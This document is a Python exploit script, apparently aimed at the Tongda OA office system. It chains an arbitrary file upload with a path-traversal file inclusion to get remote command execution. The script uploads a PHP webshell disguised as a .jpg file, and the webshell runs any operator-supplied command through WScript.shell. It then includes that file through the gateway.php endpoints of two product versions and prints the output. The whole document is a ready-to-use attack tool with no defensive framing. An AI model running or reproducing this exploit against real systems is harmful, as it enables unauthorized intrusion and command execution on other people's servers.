# -*- coding: utf-8 -*-
import requests,sys

#author: mai-lang-chai
#ref:@小杰尼 @jas502n

def exp(url,cmd):
    upload_url = url + "/ispirit/im/upload.php"
    include_url_2013 = url + "/ispirit/interface/gateway.php"
    include_url_2017 = url + "/mac/gateway.php"
    files = {'ATTACHMENT':"<?php $command='%s';$wsh = new COM('WScript.shell');$exec = $wsh->exec('cmd /c '.$command);$stdout = $exec->StdOut();$stroutput = $stdout->ReadAll();echo $stroutput;?>" %cmd}
    upload_data={"P":"123","Filename":"php.jpg","DEST_UID":"1","UPLOAD_MODE":"2"}
    upload_res=requests.post(upload_url,upload_data,files=files)
    path = upload_res.text
    path = path[path.find('@')+1:path.rfind('|')].replace("_","\/").replace("|",".")

    include_data={"json":"{\"url\":\"/general/../../attach/im/"+path+"\"}"}
    include_res = requests.post(include_url_2013,data=include_data)
    if "No input file specified" in include_res.text:
        include_res = requests.post(include_url_2017,data=include_data)
        if "No input file specified" in include_res.text: 
            print("[-]Seems Not Vul --  " + include_res.text)
    else:
        print("[*]Good Luck \n" + include_res.text)

if __name__ == '__main__' :
    if len(sys.argv) != 3:
        print("eg: python3 通达OA任意文件上传配合文件包含导致的RCE.py http://10.0.0.1:81 whoami")
    try:
        url = sys.argv[1]
        cmd = sys.argv[2]
        exp(url, cmd)
    except:
        exit()